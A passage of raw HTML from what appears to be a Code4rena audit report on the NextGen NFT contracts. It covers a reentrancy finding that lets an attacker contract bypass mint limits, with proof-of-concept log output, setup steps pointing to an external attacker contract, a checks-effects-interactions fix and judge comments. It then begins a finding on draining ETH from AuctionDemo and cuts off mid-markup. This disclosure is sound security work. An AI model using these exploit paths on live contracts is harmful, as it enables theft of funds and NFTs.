2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Logs result:</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"yaml\" data-index=\"3\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">(Collection Circulation Supply Before)</span><span class=\"mtk1\">      :  </span><span class=\"mtk7\">0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">(Balance of attacker contract Before)</span><span class=\"mtk1\">       :  </span><span class=\"mtk7\">49000000000000000000</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">(Col 1 Balance of attacker contract Before)</span><span class=\"mtk1\"> :  </span><span class=\"mtk7\">0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">(Collection Circulation Supply After)</span><span class=\"mtk1\">       :  </span><span class=\"mtk7\">50</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">(Balance of attacker contract After)</span><span class=\"mtk1\">        :  </span><span class=\"mtk7\">0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">(Col 1 Balance of attacker contract After)</span><span class=\"mtk1\">  :  </span><span class=\"mtk7\">50</span></span></span></code></pre>\n<h3 id=\"test-setup\" style=\"position:relative;\"><a href=\"#test-setup\" aria-label=\"test setup permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Test Setup:</h3>\n<ul>\n<li>Clone the repository: <a href=\"https://github.com/0xbtk/NextGen-Setup.git\">https://github.com/0xbtk/NextGen-Setup.git</a>.</li>\n<li>Add the attackerâ€™s contract in the Helpers folder from this <a href=\"https://gist.github.com/0xbtk/57496ae3761917c2f0e9f6ac3d23c300#file-mintallsupply-sol\">link</a>.</li>\n<li>Incorporate the tests in <code>NextGenSecurityReview</code>.</li>\n<li>Execute: <code>forge test --mt testMintAllTheCollection -vvv</code>.</li>\n</ul>\n<h3 id=\"recommended-mitigation-steps\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps\" aria-label=\"recommended mitigation steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>We recommend following <a href=\"https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html\">Check Effects Interactions</a> in <code>NextGenCore::mint</code> as follow:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"4\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">phase</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">1</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">tokensMintedAllowlistAddress</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionID</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_mintingAddress</span><span class=\"mtk1\">]++;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">tokensMintedPerAddress</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionID</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_mintingAddress</span><span class=\"mtk1\">]++;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Minting logic should be here</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"assessed-type\" style=\"position:relative;\"><a href=\"#assessed-type\" aria-label=\"assessed type permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Assessed type</h3>\n<p>Reentrancy</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/51#issuecomment-1822678898\">a2rocket (NextGen) confirmed via duplicate issue #51</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1517#issuecomment-1839451072\">0xsomeone (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has illustrated how a re-entrant EIP-721 hook can be exploited to bypass the allowlist/public limitations set forth for a collection.</p>\n<p>The Sponsor has confirmed the finding and I deem it valid as the code will update the minted per address mappings <strong>after the â€œsafeâ€ mint operation</strong>, thereby being susceptible to the re-entrancy described. Its severity of â€œhighâ€ is also deemed correct given that a main invariant of the system (mint limitations so scarcity of an NFT) can be broken arbitrarily as the re-entrancy attack can be repetitively replayed.</p>\n<p>The Wardenâ€™s submission was selected as the best due to its correct remediation relying on enforcement of the CEI pattern, short-and-sweet PoC, and overall clean submission.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1517#issuecomment-1847710278\">0xsomeone (judge) commented</a>:</strong></p>\n<blockquote>\n<p>After discussions with fellow judges, I have opted to split re-entrancy vulnerabilities into two separate instances:</p>\n<ul>\n<li>Absence of the CEI Pattern in <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L193-L199\"><code>NextGenCore::mint</code></a></li>\n<li>Absence of the CEI Pattern in <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L234-L253\"><code>MinterContract::mint</code></a></li>\n</ul>\n<p>In my opinion, those two constitute different vulnerabilities as they relate to different state variables. The rationale behind this â€œsplitâ€ is that when we consider the root cause for a vulnerability to render two submissions distinct, we have to treat a re-entrancy as a desirable trait of the EVM. Additionally, we cannot assume a rational fix is the application of the <code>ReentrancyGuard::nonReentrant</code> modifier; <strong>the enforcement of the CEI pattern</strong> is widely recognized as the â€œcorrectâ€ way to resolve these issues.</p>\n<p>This assumption falls in line with what the Solidity documentation has <strong>instructed since its inception</strong>, given that the security considerations of the language clearly state that the CEI pattern <a href=\"https://docs.soliditylang.org/en/v0.8.23/security-considerations.html#reentrancy\">should be applied and do not mention â€œre-entrancyâ€ guards</a>. As such, the root causes described in this issue are two unique ones: </p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1517\">#1517</a>: Absence of the CEI Pattern in <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L193-L199\"><code>NextGenCore::mint</code></a></li>\n<li><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/2048\">#2048</a>: Absence of the CEI Pattern in <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L234-L253\"><code>MinterContract::mint</code></a></li>\n</ul>\n<p>EDIT: After further consideration, I have opted to retain only this submission as a valid of the two.</p>\n<p>The absence of the CEI pattern in #2048 leads to an incorrect <code>getPrice</code> being utilized for multiple <strong>valid</strong> mints in a period, and no Warden identified that particular aspect that is vulnerable. As such, I have proceeded to invalidate the submission and its duplicates.</p>\n</blockquote>\n<hr>\n<h2 id=\"h-02-attacker-can-drain-all-eth-from-auctiondemo-when-blocktimestamp--auctionendtime\" style=\"position:relative;\"><a href=\"#h-02-attacker-can-drain-all-eth-from-auctiondemo-when-blocktimestamp--auctionendtime\" aria-label=\"h 02 attacker can drain all eth from auctiondemo when blocktimestamp  auctionendtime permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1323\">[H-02] Attacker can drain all ETH from <code>AuctionDemo</code> when <code>block.timestamp == auctionEndTime</code></a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1323\">smiling_heretic</a>, also found by <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1931\">0xgrbr</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1929\">0xMango</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1912\">merlin</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1904\">devival</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1899\">alexxander</a>, DeFiHackLabs (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1819\">1</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1006\">2</a>), Udsen (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1811\">1</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1788\">2</a>), <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1787\">inzinko</a>, ciphermarco (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1786\">1</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1784\">2</a>), <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1772\">TuringConsulting</a>, Madalad (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1754\">1</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1749\">2</a>), immeas (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1716\">1</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1702\">2</a>), <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1677\">oakcobalt</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1654\">phoenixV110</a>, jasonxiale (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1636\">1</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1628\">2</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1623\">3</a>), <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1582\">Silvermist</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1547\">xeros</a>, btk (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1521\">1</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1513\">2</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1507\">3</a>), sl1 (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1515\">1</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1313\">2</a>), <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1468\">Toshii</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1443\">3th</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1374\">Haipls</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1373\">mahyar</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1370\">DarkTower</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1369\">Talfao</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1356\">r0ck3tz</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1337\">dethera</a>, AvantGard (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1322\">1</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1321\">2</a>), Neon2835 (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1280\">1</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1249\">2</a>), <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1262\">seeques</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1261\">Zach_166</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1252\">Fulum</a>, Arabadzhiev (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1251\">1</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1092\">2</a>), Eigenvectors (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1241\">1</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1240\">2</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1239\">3</a>), 00xSEV (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1215\">1</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1212\">2</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1210\">3</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1208\">4</a>), <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1205\">nuthan2x</a>, zhaojie (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1180\">1</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1172\">2</a>), lsaudit (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1155\">1</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1152\">2</a>), audityourcontracts (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1130\">1</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1129\">2</a>), <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1099\">Al-Qa-qa</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1093\">bird-flu</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1077\">MrPotatoMagic</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1072\">Delvir0</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1063\">bronze_pickaxe</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1059\">xuwinnie</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1043\">0xMAKEOUTHILL</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/991\">PENGUN</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/977\">rotcivegaf</a>, droptpackets (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/975\">1</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/934\">2</a>), <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/954\">Greed</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/915\">0xDetermination</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/911\">fibonacci</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/880\">gumgumzum</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/802\">cartlex_</a>, ChrisTina (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/792\">1</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/791\">2</a>), <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/790\">Kow</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/754\">ke1caM</a>, The_Kakers (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/735\">1</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/733\">2</a>), 0xAsen (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/679\">1</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/183\">2</a>), <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/665\">aslanbek</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/627\">Jorgect</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/618\">0xJuda</a>, amaechieth (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/567\">1</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/425\">2</a>), xAriextz (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/494\">1</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/490\">2</a>), <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/483\">Krace</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/463\">CaeraDenoir</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/428\">Ruhum</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/410\">darksnow</a>, Draiakoo (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/399\">1</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/145\">2</a>), <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/370\">_eperezok</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/339\">0x180db</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/330\">degensec</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/305\">NoamYakov</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/289\">openwide</a>, Zac (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/274\">1</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/125\">2</a>), <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/241\">bdmcbri</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/169\">HChang26</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/66\">0x3b</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/56\">ABA</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/35\">epistkr</a>, slvDev (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/2029\">1</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1966\">2</a>), <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1994\">cryptothemex</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1918\">blutorque</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1896\">vangrim</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1815\">Kose</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1779\">0xSwahili</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1770\">tnquanghuy0512</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1680\">c0pp3rscr3w3r</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1616\">yobiz</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1596\">ast3ros</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1583\">shenwilly</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1561\">c3phas</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1540\">0xarno</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1494\">innertia</a>, trachev (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1430\">1</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1420\">2</a>), <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1268\">Oxsadeeq</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1250\">aldarion</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1245\">Norah</a>, cu5t0mpeo (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1110\">1</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1107\">2</a>), <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1081\">VAD37</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1050\">Vagner</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1040\">circlelooper</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1028\">alexfilippov314</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/999\">0xsagetony</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/985\">volodya</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/981\">ak1</a>, 0x_6a70 (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/948\">1</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/938\">2</a>), SpicyMeatball (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/940\">1</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/898\">2</a>), <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/924\">MaNcHaSsS</a>, 0x656c68616a (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/862\">1</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/861\">2</a>), <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/841\">JohnnyTime</a>, dimulski (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/823\">1</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/789\">2</a>), Inference (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/819\">1</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/817\">2</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/810\">3</a>), <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/777\">lanrebayode77</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/774\">crunch</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/762\">TermoHash</a>, t0x1c (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/730\">1</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/725\">2</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/692\">3</a>), <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/716\">ayden</a>, Soul22 (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/655\">1</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/650\">2</a>), <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/533\">0xpiken</a>, tallo (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/421\">1</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/413\">2</a>), <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/403\">tpiliposian</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/328\">orion</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/318\">REKCAH</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/315\">DanielArmstrong</a>, cccz (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/210\">1</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/209\">2</a>), <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/190\">Shubham</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/171\">8olidity</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/153\">ZdravkoHr</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/148\">evmboi32</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/53\">max10afternoon</a>, 0xAadi (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1910\">1</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1867\">2</a>), <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1797\">pontifex</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1612\">kimchi</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1413\">0xMosh</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1379\">SovaSlava</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1263\">joesan</a>, Jiamin (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1197\">1</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1195\">2</a>), <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1146\">Kaysoft</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1011\">00decree</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/848\">Hama</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/701\">mrudenko</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/680\">twcctop</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/652\">Deft_TT</a>, Juntao (<a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/635\">1</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/630\">2</a>), <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/433\">0xAleko</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/391\">y4y</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/281\">AerialRaider</a>, and <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/65\">rvierdiiev</a></em></p>\n<p>Itâ€™s possible to drain all ETH from the <code>AuctionDemo</code> contract. There are two bugs that make it possible when theyâ€™re exploited together.</p>\n<h3 id=\"first-bug\" style=\"position:relative;\"><a href=\"#first-bug\" aria-label=\"first bug permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 